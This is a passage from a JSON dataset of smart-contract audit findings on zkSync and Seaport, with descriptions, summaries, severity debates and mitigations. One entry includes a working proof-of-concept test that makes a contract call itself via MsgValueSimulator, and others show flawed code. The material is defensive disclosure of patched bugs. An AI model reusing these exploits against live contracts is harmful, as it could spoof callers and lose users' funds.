Severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the DefaultAccount.executeTransaction function in the zksync codebase. This function executes a user transaction after it has been validated, and calls the _execute function under the hood. Depending on the destination address of the transaction, it will either pass the call to the contract or execute the call via EfficientCall.rawCall. If the transaction sends ETH (msg.value is positive), EfficientCall.rawCall will pass the call to the MsgValueSimulator contract. The MsgValueSimulator contract will set the isSystemCall flag to true, making the call a system one, which will let it call the system contracts. This should not be allowed, as it could potentially lead to dangerous operations being invoked.\n\nThe recommended mitigation steps are to set the forward mask to 0 in the EfficientCall.rawCall function, similar to the msgValueSimulatorMimicCall function from the bootloader. This will prevent the isSystemCall flag from being set to true, and thus users will not be able to call system contracts directly.\n\nThe issue has been confirmed by miladpiri (zkSync) and Alex the Entreprenerd (judge) have commented that it is a medium severity issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "https://github.com/code-423n4/2023-03-zksync-findings/issues/146",
      "tags": [],
      "finders": [
        "Jeiwan",
        "ronnyx2017"
      ]
    },
    {
      "id": "19903",
      "title": "[M-01] deploying contracts with `forceDeployOnAddress` will break contracts when `callConstructor` is false",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L212-L227><br>\n<https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L302-L306>\n\nWhen function `forceDeployOnAddress()` used for deploying contract and `callConstructor` is false, then contract's bytecodehash would stay in constructing state and calling the contract won't be possible. it can cause protocol and other contracts that are using it to break and if they call that address and sends some funds, then those funds would be lost. the issue is critical because the updated contract(which is updated by calling `forceDeployOnAddress()`) can be part of important process like bridging or sending messages or withdrawing funds.\n\n### Proof of Concept\n\nThis is `forceDeployOnAddress()` code in ContractDeployer:\n\n```solidity\n    /// @notice The method that can be used to forcefully deploy a contract.\n    /// @param _deployment Information about the forced deployment.\n    /// @param _sender The `msg.sender` inside the constructor call.\n    function forceDeployOnAddress(ForceDeployment calldata _deployment, address _sender) external payable onlySelf {\n        _ensureBytecodeIsKnown(_deployment.bytecodeHash);\n        _storeConstructingByteCodeHashOnAddress(_deployment.newAddress, _deployment.bytecodeHash);\n\n        AccountInfo memory newAccountInfo;\n        newAccountInfo.supportedAAVersion = AccountAbstractionVersion.None;\n        // Accounts have sequential nonces by default.\n        newAccountInfo.nonceOrdering = AccountNonceOrdering.Sequential;\n        _storeAccountInfo(_deployment.newAddress, newAccountInfo);\n\n        if (_deployment.callConstructor) {\n            _constructContract(_sender, _deployment.newAddress, _deployment.input, false);\n        }\n\n        emit ContractDeployed(_sender, _deployment.bytecodeHash, _deployment.newAddress);\n    }\n```\n\nAs you can see in the second line code calls `_storeConstructingByteCodeHashOnAddress()` and it would set constructing bytecode hash the address(the second byte is 1), and when `_deployment.callConstructor` is false, code won't call `_constructContract()` (which sets the address's bytecode hash as constructed after calling constructor) and contract bytecode hash would stay in constructing state after the deployment.\n\nThe constructing bytecode state is there to prevent other contracts to call this contract when this contract's constructor is called. Constructing state means that \"if anyone else call the contract, it will behaves like a contract being constructing (EmptyContract/EOA)\". so contract won't be callable if it stays in the Constructing state. This can cause serious issues, like this scenario:\n\nIf important contracts like L1Messenger, L2EthToken, MsgValueSimulator, ... needed upgrade and their code upgraded with this deployer function(and admin didn't want to call constructor as initiating the contract again would break it), then the contract logics won't be callable by others but it would still behave like EmptyContract, the transaction won't revert and other contracts logics won't get interrupted but they don't work properly, for example user would spend funds(send to the updated contract) but because logics won't get executed the funds would be lost.\n\nThe real impact may be different based on the target contract that is being deployed by this function(when `callConstructor`=false), but in each time the contract deployment would break the contract and deployment would be faulted. the issue can happen every time and using this function to upgrade system contracts without calling constructor is common. for example imagine there is a contract, that have constructor that initialize the state. It is supposed to be called only once, for the first deployment. But protocol want to redeploy contract, that state of the contract is the same as before force deployment. So they want to skip the constructing phrase.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nEven when `callConstructor` is false, and code doesn't call the constructor, code should set the address's bytecode hash to Constructed state after the deployment.\n\n**[miladpiri (zkSync) disagreed with severity and commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/167#issuecomment-1484841996):**\n > The issue is real and fixed.\n> \n> The severity is **Medium**.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/167#issuecomment-1497371822):**\n > The Warden has shown how, the `forceDeployOnAddress` function allows calling a contract in a way that can brick it, because the issue is notable but reliant on a mistake, while I have considered Low Severity (user mistake), I believe Medium Severity to be the most appropriate, because the system is not behaving in the intended way.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the `forceDeployOnAddress()` function of the ContractDeployer code. This function is used for deploying contracts and the issue occurs when `callConstructor` is false. In this case, the contract's bytecodehash would stay in the constructing state and calling the contract won't be possible, which can cause the protocol and other contracts that are using it to break. If they call that address and sends some funds, then those funds would be lost. This issue is critical because the updated contract can be part of important processes like bridging, sending messages, or withdrawing funds.\n\nThe proof of concept for this issue is provided in the code snippet of the function. It shows how the code calls `_storeConstructingByteCodeHashOnAddress()` and it would set constructing bytecode hash the address, and when `_deployment.callConstructor` is false, code won't call `_constructContract()` and contract bytecode hash would stay in constructing state after the deployment. This can cause serious issues, like when other contracts call the contract and the transaction won't revert, leading to funds being lost.\n\nThe recommended mitigation step for this issue is that even when `callConstructor` is false, code should set the address's bytecode hash to Constructed state after the deployment. The severity of the issue was initially considered High, but it was decreased to Medium due to the issue being reliant on a mistake.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "https://github.com/code-423n4/2023-03-zksync-findings/issues/167",
      "tags": [],
      "finders": [
        "bin2chen",
        "HE1M",
        "unforgiven",
        "rvierdiiev",
        "Franfran"
      ]
    },
    {
      "id": "19902",
      "title": "[H-01] The call to `MsgValueSimulator` with non zero `msg.value` will call to sender itself which will bypass the `onlySelf` check",
      "impact": "HIGH",
      "content": "\nFirst, I need to clarify, there may be more serious ways to exploit this issue. Due to the lack of time and documents, I cannot complete further exploit. The current exploit has only achieved the impact in the title. I will expand the possibility of further exploit in the poc chapter.\n\nThe call to MsgValueSimulator with non zero msg.value will call to sender itself with the msg.data. It means that if you can make a contract or a custom account call to specified address with non zero msg.value (that's very common in withdrawal functions and smart contract wallets), you can make the contract/account call itself. And if you can also control the calldata, you can make the contract/account call its functions by itself.\n\nIt will bypass some security check with the msg.sender, or break the accounting logic of some contracts which use the msg.sender as account name.\n\nFor example the `onlySelf` modifier in the ContractDepolyer contract:\n\n    modifier onlySelf() {\n        require(msg.sender == address(this), \"Callable only by self\");\n        _;\n    }\n\n### Proof of Concept\n\nThe `MsgValueSimulator` use the `mimicCall` to forward the original call.\n\n    return EfficientCall.mimicCall(gasleft(), to, _data, msg.sender, false, isSystemCall);\n\nAnd if the `to` address is the `MsgValueSimulator` address, it will go back to the `MsgValueSimulator.fallback` function again.\n\nThe fallback function will  Extract the `value` to send, isSystemCall flag and the `to` address from the extraAbi params(r3,r4,r5) in the `_getAbiParams` function. But it's different from the first call to the `MsgValueSimulator`. The account uses `EfficientCall.rawCall` function to call the `MsgValueSimulator.fallback` in the first call. For example, code in `DefaultAccount._execute`:\n\n    bool success = EfficientCall.rawCall(gas, to, value, data);\n\nThe rawCall will simulate `system_call_byref` opcode to call the `MsgValueSimulator`. And the `system_call_byref` will write the r3-r5 registers which are read as the above extraAbi params.\n\nBut the second call is sent by `EfficientCall.mimicCall`, as the return value explained in the document <https://github.com/code-423n4/2023-03-zksync/blob/main/docs/VM-specific_v1.3.0_opcodes_simulation.pdf>, `mimicCall` will mess up the registers and will use r1-r4 for standard ABI convention and r5 for the extra who_to_mimic arg. So extraAbi params(r3-r5) read by `_getAbiParams` will be messy data. It can lead to very serious consequences, because the r3 will be used as the msg.value, and the r4 will be used as the `to` address in the final `mimicCall`. It means that the contract will send a different(greater) value to a different address, which is unexpected in the original call.\n\nI really don't know how to write a complex test to verify register changes in the era-compiler-tester. So to find out how to control the registers, I use the repo <https://github.com/matter-labs/zksync-era> and replace the etc/system-contracts/ codes with the lastest version in the audit, and write an integration test.\n\n```\nimport { TestMaster } from '../src/index';\nimport * as zksync from 'zksync-web3';\nimport { BigNumber } from 'ethers';\n\ndescribe('ETH token checks', () => {\n    let testMaster: TestMaster;\n    let alice: zksync.Wallet;\n    let bob: zksync.Wallet;\n\n    beforeAll(() => {\n        testMaster = TestMaster.getInstance(__filename);\n        alice = testMaster.mainAccount();\n        bob = testMaster.newEmptyAccount();\n    });\n\n    test('Can perform a transfer (legacy)', async () => {\n        const LEGACY_TX_TYPE = 0;\n        const value = BigNumber.from(30000);\n        \n        const MSG_VALUE_SYSTEM_CONTRACT = \"0x0000000000000000000000000000000000008009\";\n        console.log(await alice.getBalance());\n        console.log(await alice.provider.getBalance(MSG_VALUE_SYSTEM_CONTRACT));\n\n        let block = await alice.provider.getBlock(\"latest\");\n        console.log(\"block gas limit\", block.gasLimit);\n        let tx_gasLimit = block.gasLimit.div(8);\n        console.log(\"tx_gasLimit\", tx_gasLimit);\n        console.log(\"gas price\", await alice.getGasPrice());\n\n        try {\n            let tx = await alice.sendTransaction({ type: LEGACY_TX_TYPE, to: MSG_VALUE_SYSTEM_CONTRACT, value , gasLimit: tx_gasLimit, data: '0x'});\n            let txp = await tx.wait();\n            console.log(\"success\");\n            console.log(txp[\"logs\"]);\n        } catch (err ) {\n            console.log(\"fail\");\n            console.log(err);\n            console.log('--------');\n            console.log(err[\"receipt\"][\"logs\"]);\n        }\n        \n        console.log(await alice.getBalance());\n        console.log(await alice.provider.getBalance(MSG_VALUE_SYSTEM_CONTRACT));\n        console.log(await alice.getNonce());\n    });\n\n    afterAll(async () => {\n        await testMaster.deinitialize();\n    });\n});\n\n```\n\nThe L2EthToken Transfer event logs:\n\n        {\n            transactionIndex: 0,\n            blockNumber: 25,\n            transactionHash: '0x997b6536c802620e56f8c1b54a0bd3092dfe3dde457f91ca75ec07740c82fde1',\n            address: '0x000000000000000000000000000000000000800A',\n            topics: [\n              '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',\n              '0x0000000000000000000000006a8b37bcf2decff1452fccedc1452257d016b5c4',\n              '0x0000000000000000000000000000000000000000000000000000000000008009'\n            ],\n            data: '0x0000000000000000000000000000000000000000000000000000000000007530',\n            logIndex: 1,\n            blockHash: '0xafb60d1285fc9ac08db01b02df01f6cbb668918d98f1b9254ed150a95957ba75'\n          },\n          {\n            transactionIndex: 0,\n            blockNumber: 25,\n            transactionHash: '0x997b6536c802620e56f8c1b54a0bd3092dfe3dde457f91ca75ec07740c82fde1',\n            address: '0x000000000000000000000000000000000000800A',\n            topics: [\n              '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',\n              '0x0000000000000000000000006a8b37bcf2decff1452fccedc1452257d016b5c4',\n              '0x0000000000000000000000006a8b37bcf2decff1452fccedc1452257d016b5c4'\n            ],\n            data: '0x00000000000000000000000000000000000000000002129c0000000a00000000',\n            logIndex: 2,\n            blockHash: '0xafb60d1285fc9ac08db01b02df01f6cbb668918d98f1b9254ed150a95957ba75'\n          }\n\nThere are two l2 eth token transaction in addition to gas processing. And the value sent to the `MsgValueSimulator` will stuck in the contract forever.\n\nI found that the r4(to) is always msg.sender, the r5(mask) is always 0x1, and if the length of the calldata is 0, the r3(value) will be `0x2129c0000000a00000000`, and if the length > 0, r3(value) will be `0x215800000000a00000000 + calldata.length << 96`. So in this case, the balance of the sender should be at least 0x2129c0000000a00000000 wei to finish the whole transaction whitout reverting.\n\nI did not find any document about the `standard ABI convention` mentioned in the VM-specific_v1.3.0\\_opcodes_simulation.pdf and the r5 is also not really the extra who\\_to\\_mimic arg. I didn't make a more serious exploit due to lack of time. I'd like more documentation about register call conventions to verify the possibility of manipulating registers.\n\n### Recommended Mitigation Steps\n\nCheck the `to` address in the `MsgValueSimulator` contract.  The `to` address must not be the `MsgValueSimulator` address.\n\n***Note: extensive discussion took place regarding this issue. Final comments are included below. For full details, please see the [original submission](https://github.com/code-423n4/2023-03-zksync-findings/issues/153).***\n\n**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/153#issuecomment-1509370360):**\n > Hey @ronnyx2017 & @Alex the Entreprenerd,\n> \n> I managed to reproduce the issue. @ronnyx2017 is right, if Alice calls `msgValueSimulator` with `msgValueSimulator` as a recipient then:\n> 1) Alice (contract) transferred funds to the `msgValueSimulator`\n> 2) `msgValueSimulator` reenter itself with a changed register:\n> - value = rawFatPointer\n> - isSystemCall = isSystemCall (was set by Alice)\n> - to = Alice.address\n> 3) Alice reenters self contract with the same `calldata` as was sent to the `msgValueSimulator` and `value == rawFatPointer`.\n> 4) Alice sends `rawFatPointer` wei to herself.\n> \n> Please note the `fatPointer` is the struct: \n> \n> ```rs\n> pub struct FatPointer {\n>     pub offset: u32,\n>     pub memory_page: u32,\n>     pub start: u32,\n>     pub length: u32,\n> }\n> ```\n> \n> And its raw representation:\n> \n> ```rs\n> rawFatPointer = length || start || memory_page || offset\n> ```\n> \n> Depending on the use case, a user could manipulate the `msg.value` of the reentrant call. However if `length > 0`, the `rawFatPointer = msg.value >= 2^96`. So if an attacker manipulates `length`, the result `msg.value` will be very large, so the attack is realistically impossible. Just as note, `2^96 wei == 79228162514 Ether == $100 trillion`.\n> \n> So the length of the data should be 0, but manipulating other data is still possible. \n> \n> I see the impact of a non-unauthorized call to itself fallback function. It is indeed pretty bad, even though I don't know any smart contract that would suffer from this in practice. \n> \n> All in all, I confirm the issue and appreciate that deep research, thanks a lot @ronnyx2017!\n\n**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/153#issuecomment-1509373265):**\n > For a note here is the test that we add to our `compiler-tester` to reproduce the issue.\n> \n> ```\n> pragma solidity ^0.8.0;\n> \n> // The same copy of the system contracts that was on the scope.\n> import \"./system-contracts/libraries/EfficientCall.sol\";\n> \n> contract Main {\n>     /// @dev The address of msgValueSimulator system contract.\n>     address constant MSG_VALUE_SIMULATOR_ADDRESS = address(0x8009);\n> \n> \n>     /// @dev Number of times that fallback function was called.\n>     uint256 fallbackEntrantCounter;\n> \n>     function test() external payable {\n>         // Reset counter, after the call to msgValueSimulator it should be increased\n>         fallbackEntrantCounter = 0;\n> \n>         require(msg.value >= 2, \"msg.value should be at least 2 to \");\n> \n>         // The same pattern as on `DefaultAccount`\n>         bool success = EfficientCall.rawCall(gasleft(), MSG_VALUE_SIMULATOR_ADDRESS, msg.value / 2, msg.data[0:0]);\n>         if (!success) {\n>             EfficientCall.propagateRevert();\n>         }\n> \n>         require(fallbackEntrantCounter == 1, \"Fallback function wasn't called\");\n>     }\n>     \n>     fallback() external payable {\n>         fallbackEntrantCounter++;\n>      }\n> }\n> ```\n\n**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/153#issuecomment-1509378015):**\n > Last but not least, even though the impact of the issue wasn't clear to us after triaging the report,  the fix was done immediately after the end of the audit, before the launch. So this (and others) issues are not in production.\n> \n> <img width=\"1307\" alt=\"Screenshot 2023-04-15 at 01 00 39\" src=\"https://user-images.githubusercontent.com/41153528/232168223-dee79928-8602-4f25-b31e-ace1c301c43b.png\">\n> \n> https://explorer.zksync.io/address/0x0000000000000000000000000000000000008009#contract\n> \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/153#issuecomment-1509676152):**\n > Thank you @vladbochok for the extra detail and am glad this was already addressed.\n> \n> I do believe self-calling opens up to a category of exploits, especially for contracts that for example use try/catch or have \"unusual\" behaviour around transfers.\n> \n> I believe we can agree that the finding is unique and at least of medium severity -> Incorrect behaviour, which can conditionally lose funds.\n> \n> We must agree that the operation also can be viewed as account hijacking, in the sense that we can impersonate the receiving contract and then have it call itself.\n> \n> These lead me to believe that a higher severity should be appropriate.\n> \n> Have asked for advice to other judges with the goal of clarifying if there was sufficient information in the original submission, I believe the initial POC was valid but I want to get their perspective.\n> \n> Glad this was found and sorted.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-03-zksync-findings/issues/153#issuecomment-1510358820):**\n > While plenty of discussion has happened, the original finding has shown a valid POC that shows the following impact:\n> - By performing a call with value, we can forge a call that will cause the target contract to call itself\n> \n> The discussion after that helped demonstrate the report's validity and the Sponsor has already mitigated the potential risk.\n> \n> The ability for a specific contract to call self can be met with some skepticism in terms of its impact, however, I believe that in different scenarios, the severity would easily be raised to High.\n> \n> For example:\n> - Bridge contracts that call to self\n> - Contract that calls to self to use try/catch\n> - Vault Contracts, can be tricked into minting empty shares (no-op transfers), if the caller and the payer are the same (quirkiness of DAI)\n> \n> If those contracts were in-scope and the setup demonstrated in the finding was not patched, the finding would have easily been rated as High Severity.\n> \n> In this case, those contracts are not in-scope, so I would maintain a Medium Severity, because that's reliant on the specific integrators using that pattern.\n> \n> In contrast to `isSystem` which breaks an invariant on fully in-scope contracts, without the ability of causing damage, I have reason to believe that this specific vulnerability could have caused higher degrees of damage, for example:\n> \n> - Contracts that allow to call or delegate call\n> - Vault Contracts as shown above\n> - Contracts where there is no expectation that the contract can call itself (as it may mess up the balance, accounting, etc..)\n> \n> Given the following considerations, I have asked myself whether this is a type of risk that would in any way be imputable to the integrator as a quirk, and at this time I cannot justify that.\n> \n> For the logic above, because the finding has shown a way to break a very strong expectation that a contract cannot call itself unless programmed for it, considering this as `msg.sender` spoofing, although limited to `self` calls, considering the potential risks for integrators, and the breaking of expectations for EVM systems, I am raising the finding to High Severity because I believe this would have not been a risk that the Sponsor would have wanted any user nor developer to take.\n> \n> The Sponsor has already mitigated the finding at the time of writing\n\n\n\n***\n \n",
      "summary": "\nA bug report was submitted concerning the MsgValueSimulator contract in zkSync. The bug allows a contract or custom account to call itself with a non-zero msg.value. This could potentially bypass security checks that rely on the msg.sender, or break the accounting logic of certain contracts. The bug is caused by the fact that the MsgValueSimulator uses the mimicCall to forward the original call, which messes up the registers, allowing the msg.value and the to address to be changed from the original call. This could lead to very serious consequences, such as a contract sending a different (greater) value to a different address than expected. The bug was initially rated as Medium Severity, but after discussing the potential risks and the breaking of expectations for EVM systems, it was raised to High Severity. The Sponsor has already mitigated the bug at the time of writing.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-03-zksync",
      "github_link": "https://github.com/code-423n4/2023-03-zksync-findings/issues/153",
      "tags": [],
      "finders": [
        "ronnyx2017"
      ]
    },
    {
      "id": "15970",
      "title": "The size calculation can be incorrect for large numbers",
      "impact": "LOW",
      "content": "## Context\n- ConsiderationEncoder.sol#L53-L63\n- ConsiderationConstants.sol#L113\n\n## Description\nThe maximum value of memory offset is defined in `PointerLibraries.sol#L22` as `OffsetOrLengthMask = 0xffffffff`, i.e., `2^32 - 1`. However, the mask `OnlyFullWordMask = 0xffffe0;` is defined to be a 24-bit number.\n\nAssume that the length of the `bytes` type where `srcpoints` is `0xffffe0`, then the following piece of code incorrectly computes the size as `0`.\n\n```solidity\nfunction abi_encode_bytes(\n    MemoryPointer src,\n    MemoryPointer dst\n) internal view returns (uint256 size) {\n    unchecked {\n        size = \n            ((src.readUint256() & OffsetOrLengthMask) + AlmostTwoWords) & \n            OnlyFullWordMask;\n        ...\n    }\n}\n```\n\nThis is because the constant `OnlyFullWordMask` does not have the two higher order bytes set (as a 32-bit type). \n\n**Note:** In practice, it can be difficult to construct `bytes` of length `0xffffe0` due to the upper bound defined by the block gas limit. However, this length is still below Seaport's `OffsetOrLengthMask`, and therefore may be able to evade many checks.\n\n## Recommendation\nChange the value of `OnlyFullWordMask` to `0xffffffe0`. But it does not fully fix this problem, as if `len >= 0xffffffc1`, the calculations can encounter the same issues. However, these numbers are impractical in the EVM and therefore may not be of concern.\n\nThere are two potential approaches to this:\n\n1. Revert early if length is `>= 0xffffffc1`. This is the value beyond which the `add(len, 63)` takes more than 32 bits.\n2. Assign a large value for the rounded up length for any values `>= 0xffffffc1`. `2**32 - 1` is a possibility.\n\nOption 1 would be consistent with Solidity generated code - revert early if the length is too large for specific operations.\n\n## Z3 Proof\nHere's the above Z3 proof with the extra constraint that length is below `0xffffffc1`. This is now unsatisfiable.\n\n```python\nfrom z3 import *\ndef AND(x, y):\n    return x & y\ndef ADD(x, y):\n    return x + y\n\nn_bits = 256\nsymb_len = BitVec('Len', n_bits)\nconst_OnlyFullWordMask = BitVecVal(0xffffffe0, n_bits)\nconst_AlmostTwoWords = BitVecVal(0x3f, n_bits)\nsolver = Solver()\n\n## The expression (for ConsiderationEncoder)\n## from https://github.com/ProjectOpenSea/seaport/pull/798/files\nexpr = AND(ADD(symb_len, const_AlmostTwoWords), const_OnlyFullWordMask)\n\n## Add an upper bound about the length\nsolver.add(ULT(symb_len, BitVecVal(0xffffffc1, n_bits)))\n\n## A model where the expression evaluates to a `value < 32 `. Such model is now unsatisfiable\nsolver.add(ULT(expr, BitVecVal(32, n_bits)))\nresult = solver.check()\n\nif result == sat:\n    print(\"SAT!\")\n    print(solver.model())\nelse:\n    print(result)\n```\n\n## References\n- Seaport: Partially addressed in PR 798.\n- Spearbit: Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15969",
      "title": "getOrderStatus and getContractOffererNonce are prone to view reentrancy",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- Consideration.sol#L548\n- Consideration.sol#L607\n- OrderValidator.sol#L84-L87\n- OrderValidator.sol#L277-L280\n- OrderValidator.sol#L284-L287\n- OrderValidator.sol#L382\n\n## Description\nIn a Consideration or the Seaport contract, once `_orderStatus[orderHash]` or `_contractNonces[offerer]` gets updated, if there is a mix of contract offerer orders and partial orders are used, Seaport would call into the offerer contracts (let's call one of these offerer contracts **X**). In turn, **X** can be a contract that would call into other contracts (let's call them **Y**) that take into consideration `_orderStatus[orderHash]` or `_contractNonces[offerer]` in their codebase by calling `getOrderStatus` or `getContractOffererNonce`.\n\nThe values for `_orderStatus[orderHash]` or `_contractNonces[offerer]` might get updated after **Y** seeks those from Seaport due to, for example, multiple partial orders with the same `orderHash` or multiple offerer contract orders using the same offerer. Therefore, **Y** would only take into consideration the mid-flight values and not the final ones after the whole transaction with Seaport is completed.\n\n## Recommendation\nWe need to either make sure to update the storage parameters at the end of the call to Seaport's order fulfilling/matching endpoints (after all the calls to external contracts) or add `_assertNonReentrant()` guard to the `getOrderStatus` and `getContractOffererNonce` endpoints to avoid other contracts **Y** reading mid-flight storage parameters.\n\n## Seaport\nAcknowledged.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15968",
      "title": "Cross-Seaport re-entrancy with the stateful validateOrder call",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n`BasicOrderFulfiller.sol#L280`\n\n## Description\nThe re-entrancy check in Seaport 1.2 will prevent the Zone from interacting with Seaport 1.2 again. However, an interesting scenario arises when the conduit has open channels to both Seaport 1.1 and Seaport 1.2 (or different deployments/forks of Seaport 1.2). This can lead to cross-Seaport re-entrancy. \n\nThis is not immediately problematic, as Zones have limited functionality currently. But since Zones can be as flexible as possible, they need to be careful if they can interact with multiple versions of Seaport.\n\n**Note:** For Seaport 1.1's zone, the check `_assertRestrictedBasicOrderValidity` happens before the transfers, and it's also a static call. \n\nIn the future, Seaport 1.3 could also have the same zone interaction, i.e., stateful calls to zones, allowing for complex cross-Seaport re-entrancy between 1.2 and 1.3. \n\n**Note:** Also see `getOrderStatus` and `getContractOffererNonce`, which are prone to view reentrancy for concerns around view-only re-entrancy.\n\n## Recommendation\n- Document that cross-Seaport re-entrancy can be possible in general, and potentially problematic when paired with `_assertRestrictedBasicOrderValidity` / `validateOrder`, especially when the conduit has open channels with multiple versions of Seaport.\n- Avoid having open channels to both Seaport 1.1 and Seaport 1.2 at the same time, or between multiple versions of Seaport.\n- For Zones with complex logic, consider deploying a new Conduit and carefully assess the risk of opening new channels.\n\n## Acknowledgments\n**Seaport:** Acknowledged.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15967",
      "title": "In general a contract offerer or a zone cannot draw a conclusion accurately based on the spent offer amounts or received consideration amounts shared with them post-trasnfer",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ContractOffererInterface.sol#L7\n- ContractOffererInterface.sol#L16\n- ZoneInterface.sol#L13\n- ZoneInteraction.sol#L92\n\n## Description\nWhen one calls one of the Seaport endpoints that fulfills or matches a collection of (advanced) orders, the used offer or consideration items will go through different modification steps in the memory. In particular, the `startAmount` of these items is an important parameter to inspect:\n\n- `a`: original `startAmount` parameter shared to Seaport by the caller encoded in the memory.\n- `a0`: the interpolated value and for orders of CONTRACT order type it is the value returned by the contract offerer (interpolation does not have an effect in this case since the `startAmount` and `endAmount` are enforced to be equal).\n- `b`: must be 0 for used consideration items, otherwise the call would revert. For offer items, it can be in [0, 1) (See The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general).\n- `a0`: is the final amount shared by Seaport to either a zone for restricted orders and a contract offerer for CONTRACT order types.\n\n### Offer Items\nFor offer items, perhaps the zone or the contract offerer would like to check that the offerer has spent a maximum `a0` of that specific offer item. For the case of restricted orders where the zone's `validateOrder(...)` will be called, the offerer might end up spending more than `a0` amount of a specific token with the same identifier if the collection of orders includes:\n- A mix of open and restricted orders.\n- Multiple zones for the same offerer, offering the same token with the same identifier.\n- Multiple orders using the same zone. In this case, the zone might not have a sense of the orders of the transfers or which orders are included in the transaction in question (unless the contexts used by the zone enforce the exact ordering and number of items that can be matched/fulfilled in the same transaction).\n\nNote the order of transfers can be manipulated/engineered by constructing specific fulfillment data. Given a fulfillment data to combine/aggregate orders, there could be permutations of it that create different ordering of the executions.\n\n- An order with an actor (a consideration recipient, contract offerer, weird token, ...) that has approval to transfer this specific offer item for the offerer in question. And when Seaport calls into (NATIVE, ERC1155 token transfers, ...) this actor, the actor would transfer the token to a different address than the offerer.\n\nThere also is a special case where an order with the same offer item token and identifier is signed on a different instance of Seaport (1.0, 1.1, 1.2, ..., or other non-official versions) which an actor (a consideration recipient, contract offerer, weird token, ...) can cross-call into (related Cross-Seaport re-entrancy with the stateful `validateOrder` call).\n\nThe above issue can be avoided if the offerer makes sure to not sign different transactions across different or the same instances of Seaport which:\n1. Share the same offer type, offer token, and offer identifier,\n2. but differ in a mix of zone, and order type,\n3. can be active at a shared timestamp.\n\nAnd/or the offerer does not give untrusted parties their token approvals.\n\nA similar issue can arise for a contract offerer if they use a mix of signed orders of non-CONTRACT order type and CONTRACT order types.\n\n### Consideration Items\nFor consideration items, perhaps the zone or the contract offerer would like to check that the recipient of each consideration item has received a minimum of `a0` of that specific consideration item. This case also is similar to the offer items issues above when a mix of orders has been used.\n\n## Recommendation\nThe above issues and notes should be documented for the users. Document the decision for the current zone and contract offerer interaction patterns.\n\n**Seaport:** Acknowledged.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15966",
      "title": "When _contractNonces[offerer] gets updated no event is emitted",
      "impact": "LOW",
